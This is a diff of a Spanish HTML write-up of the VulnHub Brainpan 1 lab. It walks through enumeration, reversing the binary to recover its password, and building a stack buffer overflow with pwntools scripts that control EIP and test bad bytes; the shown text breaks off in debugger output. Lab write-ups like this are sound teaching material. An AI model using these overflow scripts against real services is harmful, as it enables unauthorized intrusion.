@@ -131,8 +131,6 @@
       <h3 class="post-title">Contenido</h3><br>
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
-        <li><a href="#bof-stack">BOF - Stack Based</a></li>
-        <li><a href="#shellcode">Shellcode Analisis</a></li>
         <li><a href="#shell-puck">Shell - puck</a></li>
         <li><a href="#shell-anansi">Shell - anansi</a></li>
         <li><a href="#shell-root">Shell - root</a></li>
@@ -148,47 +146,47 @@
 <section class="post" id="enumeration">
 <br><h3 class="post-title">Enumeración</h3><br>
 
-<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos 2 puertos abiertos, el <code class="language-plaintext highlighter-rouge">9999</code> y el <code class="language-plaintext highlighter-rouge">10000</code></p>
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos 2 puertos abiertos, el <code class="language-plaintext highlighter-rouge">9999</code> y el <code class="language-plaintext highlighter-rouge">10000</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ nmap </span><span class="p">192.168.100.2
 Nmap scan report for 192.168.100.2
 PORT      STATE    SERVICE
 9999/tcp  open     abyss
-10000/tcp open     snet-sensor-mgmt  </span>
+10000/tcp open     snet-sensor-mgmt</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al conectarnos con al puerto <code class="language-plaintext highlighter-rouge">9999</code> vemos programa que nos pide una <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<p class="plain-text">Al conectarnos con al puerto <code class="language-plaintext highlighter-rouge">9999</code> vemos programa que nos pide una <code class="language-plaintext highlighter-rouge">contraseña</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ netcat </span><span class="p">192.168.100.2 9999
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
+                                            _|
                                             _|
 
-[________________________ WELCOME TO BRAINPAN _________________________]  
-                          ENTER THE PASSWORD                              
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
 
                           >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si enviamos una contraseña incorrecta nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS DENIED</code> y termina</p>
+<p class="plain-text">Si enviamos una contraseña incorrecta nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS DENIED</code> y termina.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">[________________________ WELCOME TO BRAINPAN _________________________]  
-                          ENTER THE PASSWORD                            
+<code><span class="p">[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
 
                           >> 1234
                           ACCESS DENIED</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">10000</code> corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, que en el index tiene solo una imagen que nos habla de vulnerabilidades comunes y tal, pero no nos aporta demasiado</p>
+<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">10000</code> corre un servicio <code class="language-plaintext highlighter-rouge">http</code>, que en el index tiene solo una imagen que nos habla de vulnerabilidades comunes y tal, pero no nos aporta demasiado.</p>
 <a href="/vulnhub/brainpan1/1.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/1.png"></p></div></a>
 
-<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para aplicar fuerza bruta y encontramos un directorio <code class="language-plaintext highlighter-rouge">/bin</code></p>
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para aplicar fuerza bruta y encontramos un directorio <code class="language-plaintext highlighter-rouge">/bin</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.2:10000/FUZZ -t 100 --hc 404  
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.2:10000/FUZZ -t 100 --hc 404
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -203,63 +201,63 @@ ID           Response   Lines    Word       Chars       Payload
 000000854:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "bin"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si lo miramos desde el navegador podemos ver que tenemos capacidad de listar recursos, este directorio nos comparte un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code></p>
+<p class="plain-text">Si lo miramos desde el navegador podemos ver que tenemos capacidad de listar recursos, este directorio nos comparte un archivo llamado <code class="language-plaintext highlighter-rouge">brainpan.exe</code>.</p>
 <a href="/vulnhub/brainpan1/2.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/2.png"></p></div></a>
 
-<p class="plain-text">Como es un archivo <code class="language-plaintext highlighter-rouge">exe</code> podemos pasarlo a una máquina <code class="language-plaintext highlighter-rouge">windows</code> y ejecutarlo, al hacerlo solo nos dice que se pone en espera de conexiones por el puerto <code class="language-plaintext highlighter-rouge">9999</code> </p>
+<p class="plain-text">Como es un archivo <code class="language-plaintext highlighter-rouge">.exe</code> podemos pasarlo a una máquina <code class="language-plaintext highlighter-rouge">windows</code> y ejecutarlo, al hacerlo solo nos dice que se pone en espera de conexiones por el puerto <code class="language-plaintext highlighter-rouge">9999</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\brainpan.exe  </span><span class="p">
+<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\brainpan.exe</span><span class="p">
 [+] initializing winsock...done.
 [+] server socket created.
 [+] bind done on port 9999
 [+] waiting for connections.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nos podemos conectar con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">9999</code> esta vez usando como direccion la ip de nuestra maquina <code class="language-plaintext highlighter-rouge">windows</code> y vemos la misma aplicación de antes</p>
+<p class="plain-text">Nos podemos conectar con <code class="language-plaintext highlighter-rouge">netcat</code> al puerto <code class="language-plaintext highlighter-rouge">9999</code> esta vez usando como dirección la ip de nuestra máquina <code class="language-plaintext highlighter-rouge">windows</code> y vemos la misma aplicación de antes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9999
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
+                                            _|
                                             _|
 
-[________________________ WELCOME TO BRAINPAN _________________________]  
-                          ENTER THE PASSWORD                              
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
 
                           >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para entender su funcionamiento podemos desensamblarlo con <code class="language-plaintext highlighter-rouge">IDA</code>, iniciamos con la función <code class="language-plaintext highlighter-rouge">main()</code>, esta inicia definiendo los offsets para varias strings, luego de mostrar un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> inicializa winsock llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code></p>
+<p class="plain-text">Para entender su funcionamiento podemos desensamblarlo con <code class="language-plaintext highlighter-rouge">IDA</code>, iniciamos con la función <code class="language-plaintext highlighter-rouge">main()</code>, esta inicia definiendo los offsets para varias strings, luego de mostrar un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> inicializa winsock llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code>.</p>
 <a href="/vulnhub/brainpan1/3.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/3.png"></p></div></a>
 
-<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto, después llama a la función <code class="language-plaintext highlighter-rouge">bind</code> para vincular el socket a la dirección</p>
+<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto, después llama a la función <code class="language-plaintext highlighter-rouge">bind</code> para vincular el socket a la dirección.</p>
 <a href="/vulnhub/brainpan1/4.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/4.png"></p></div></a>
 
-<p class="plain-text">En el siguiente bloque llama a <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha en el puerto especificado en este caso el <code class="language-plaintext highlighter-rouge">9999</code> y muestra con <code class="language-plaintext highlighter-rouge">printf</code> que esta en escucha de conexiones, luego llama a <code class="language-plaintext highlighter-rouge">accept</code> para aceptar las conexiones entrantes</p>
+<p class="plain-text">En el siguiente bloque llama a <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha en el puerto especificado en este caso el <code class="language-plaintext highlighter-rouge">9999</code> y muestra con <code class="language-plaintext highlighter-rouge">printf</code> que está en escucha de conexiones, luego llama a <code class="language-plaintext highlighter-rouge">accept</code> para aceptar las conexiones entrantes.</p>
 <a href="/vulnhub/brainpan1/5.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/5.png"></p></div></a>
 
-<p class="plain-text">Una vez recibe una nueva conexión llama a <code class="language-plaintext highlighter-rouge">recv</code> para recibir un buffer previamente asignado con <code class="language-plaintext highlighter-rouge">memset</code>, una vez recibe los datos llama a la función <code class="language-plaintext highlighter-rouge">get_reply</code> a la que como argumento le pasa el buffer recibido, es personalizada asi que la analizaremos</p>
+<p class="plain-text">Una vez recibe una nueva conexión llama a <code class="language-plaintext highlighter-rouge">recv</code> para recibir un buffer previamente asignado con <code class="language-plaintext highlighter-rouge">memset</code>, una vez recibe los datos llama a la función <code class="language-plaintext highlighter-rouge">get_reply</code> a la que como argumento le pasa el buffer recibido, es personalizada asi que la analizaremos.</p>
 <a href="/vulnhub/brainpan1/6.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/6.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">get_reply</code> recibe el buffer como argumento y utiliza <code class="language-plaintext highlighter-rouge">strcpy</code> para copiarlo a un destino que setea en <code class="language-plaintext highlighter-rouge">ebp - 520</code>, luego compara lo que acaba de copiar con la cadena <code class="language-plaintext highlighter-rouge">shitstorm\n</code> utilizando <code class="language-plaintext highlighter-rouge">strcmp</code> para saber si devolver <code class="language-plaintext highlighter-rouge">true</code> o <code class="language-plaintext highlighter-rouge">false</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">get_reply</code> recibe el buffer como argumento y utiliza <code class="language-plaintext highlighter-rouge">strcpy</code> para copiarlo a un destino que setea en <code class="language-plaintext highlighter-rouge">ebp - 520</code>, luego compara lo que acaba de copiar con la cadena <code class="language-plaintext highlighter-rouge">shitstorm\n</code> utilizando <code class="language-plaintext highlighter-rouge">strcmp</code> para saber si devolver <code class="language-plaintext highlighter-rouge">true</code> o <code class="language-plaintext highlighter-rouge">false</code>.</p>
 <a href="/vulnhub/brainpan1/7.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/7.png"></p></div></a>
 
-<p class="plain-text">Nos conectamos al puerto <code class="language-plaintext highlighter-rouge">9999</code> y enviamos la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code> que encontramos, sin embargo aunque nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS GRANTED</code> el programa termina ahi</p>
+<p class="plain-text">Nos conectamos al puerto <code class="language-plaintext highlighter-rouge">9999</code> y enviamos la cadena <code class="language-plaintext highlighter-rouge">shitstorm</code> que encontramos, sin embargo aunque nos devuelve <code class="language-plaintext highlighter-rouge">ACCESS GRANTED</code> el programa termina ahí.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ netcat </span><span class="p">192.168.100.2 9999
-_|                            _|                                        
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
 _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|                          
+                                            _|
                                             _|
 
-[________________________ WELCOME TO BRAINPAN _________________________]  
-                          ENTER THE PASSWORD                              
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
 
                           >> shitstorm
                           ACCESS GRANTED</span>
@@ -267,13 +265,13 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 
 </section>
 
-<section class="post" id="bof-stack">
-<br><h3 class="post-title">Buffer Overflow - Stack Based</h3><br>
+<section class="post" id="shell-puck">
+<br><h3 class="post-title">Shell - puck</h3><br>
 
-<p class="plain-text">Para poder debuggear el ejecutable ejecutaremos la aplicación dentro <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<p class="plain-text">Para poder debuggear el ejecutable correremos la aplicación dentro <code class="language-plaintext highlighter-rouge">WinDbg</code>.</p>
 <a href="/vulnhub/brainpan1/12.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/12.png"></p></div></a>
 
-<p class="plain-text">Iniciaremos por llenar con <code class="language-plaintext highlighter-rouge">A's</code> los <code class="language-plaintext highlighter-rouge">520</code> bytes que se reservaron antes de <code class="language-plaintext highlighter-rouge">ebp</code>, luego <code class="language-plaintext highlighter-rouge">4 B's</code> bytes que van a sobrescribir el valor de <code class="language-plaintext highlighter-rouge">ebp</code> en el <code class="language-plaintext highlighter-rouge">leave</code>, y luego <code class="language-plaintext highlighter-rouge">4 C's</code> que van a sobrescribir el return address, finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> para guardar en el stack</p>
+<p class="plain-text">Iniciaremos por llenar con <code class="language-plaintext highlighter-rouge">A's</code> los <code class="language-plaintext highlighter-rouge">520</code> bytes que se reservaron antes de <code class="language-plaintext highlighter-rouge">ebp</code>, luego <code class="language-plaintext highlighter-rouge">4 B's</code> bytes que van a sobrescribir el valor de <code class="language-plaintext highlighter-rouge">ebp</code> en el <code class="language-plaintext highlighter-rouge">leave</code>, y luego <code class="language-plaintext highlighter-rouge">4 C's</code> que van a sobrescribir el return address, finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> para guardar en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
@@ -284,14 +282,14 @@ payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s
 payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
 payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 40</span><span class="p">
 
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego de enviar el exploit podemos ver que <code class="language-plaintext highlighter-rouge">ebp</code> toma el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> que equivale a <code class="language-plaintext highlighter-rouge">4 B's</code> en hexadecimal y el <code class="language-plaintext highlighter-rouge">eip</code> toma el valor de retorno que son las <code class="language-plaintext highlighter-rouge">C's</code>, también vemos las D's que enviamos en el stack, concluimos el offset al return address son <code class="language-plaintext highlighter-rouge">524</code> bytes y que nuestra data que sigue se guarda en el stack</p>
+<p class="plain-text">Luego de enviar el exploit podemos ver que <code class="language-plaintext highlighter-rouge">ebp</code> toma el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> que equivale a <code class="language-plaintext highlighter-rouge">4 B's</code> en hexadecimal y el <code class="language-plaintext highlighter-rouge">eip</code> toma el valor de retorno que son las <code class="language-plaintext highlighter-rouge">C's</code>, también vemos las D's que enviamos en el stack, concluimos el offset al return address son <code class="language-plaintext highlighter-rouge">524</code> bytes y que nuestra data que sigue se guarda en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done
 [</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
 </code></pre></div></div><br>
 
@@ -300,9 +298,9 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 (243c.26c8): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
-eax=ffffffff ebx=002d8000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280  
-eip=43434343 esp=005ff910 ebp=42424242 iopl=0         nv up ei ng nz na pe nc  
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286  
+eax=ffffffff ebx=002d8000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
+eip=43434343 esp=005ff910 ebp=42424242 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
 43434343 ??              ???
 
 </span><span class="ro">0:000></span><span class="p"> r ebp
@@ -322,30 +320,15 @@ eip=43434343
 005ff980  02 02 02 02 57 69 6e 53-6f 63 6b 20 32 2e 30 00  ....WinSock 2.0.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo siguiente sera detectar <code class="language-plaintext highlighter-rouge">badchars</code> por lo que con <code class="language-plaintext highlighter-rouge">mona</code> crearemos una lista con todos los caracteres posibles, esto nos creara un archivo <code class="language-plaintext highlighter-rouge">txt</code> y un <code class="language-plaintext highlighter-rouge">bin</code></p>
+<p class="plain-text">Lo siguiente sera detectar <code class="language-plaintext highlighter-rouge">badbytes</code> por lo que crearemos una lista con todos los caracteres posibles, esto nos creará una lista de bytes de <code class="language-plaintext highlighter-rouge">0x0</code> hasta <code class="language-plaintext highlighter-rouge">0xff</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">0:000></span><span class="p"> !py mona bytearray
-Hold on...
-[+] Command used:
-!py C:\Users\user\Documents\WinDbgX\x86\mona.py bytearray
-Generating table, excluding 0 bad chars...
-Dumping table to file
-[+] Preparing output file 'bytearray.txt'
-    - (Re)setting logfile C:\mona\bytearray.txt
-"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
-"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  
-"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
-"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
-"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
-"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
-"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
-"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
-
-Done, wrote 256 bytes to file C:\mona\bytearray.txt
-Binary output saved in C:\mona\bytearray.bin</span>
+<code><span class="ve">❯ python3 </span><span class="p">-q
+>>> bytes(range(0, 256))
+b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
+>>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Modificaremos el script para que en el stack luego del return address se guarden los posibles badchars, luego compararemos en el debugger si se alteraron los bytes</p>
+<p class="plain-text">Modificaremos el script para que en el stack luego del return address se guarden los posibles badbytes, luego compararemos en el debugger si se alteraron los bytes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
@@ -353,545 +336,110 @@ Binary output saved in C:\mona\bytearray.bin</span>
 offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-badchars </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"</span><span class="p">  
-badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span><span class="p">  
+badbytes </span><span class="o">= </span><span class="na">bytes</span><span class="p">(</span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 256</span><span class="p">))
 
 payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
 payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">badchars
+payload </span><span class="o">+= </span><span class="p">badbytes
 
-shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo siguiente es con <code class="language-plaintext highlighter-rouge">mona</code> comparar el <code class="language-plaintext highlighter-rouge">.bin</code> que nos creo con la dirección del <code class="language-plaintext highlighter-rouge">esp</code> actual, como resultado nos muestra que se corrompe despues de <code class="language-plaintext highlighter-rouge">1</code> byte quiere decir que el <code class="language-plaintext highlighter-rouge">00</code> esta corrompiendo el resto de caracteres que estan delante de el</p>
+<p class="plain-text">Lo siguiente que haremos es comparar el array original con la dirección del <code class="language-plaintext highlighter-rouge">esp</code> actual, como resultado nos muestra que se corrompe después de <code class="language-plaintext highlighter-rouge">1</code> byte quiere decir que el <code class="language-plaintext highlighter-rouge">00</code> está corrompiendo el resto de caracteres que están delante de él.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">0:000></span><span class="p"> g
-(f04.250c): Access violation - code c0000005 (first chance)
+(a70.3d54): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
-eax=ffffffff ebx=003e9000 ecx=3117303f edx=005ff700 esi=31171280 edi=31171280
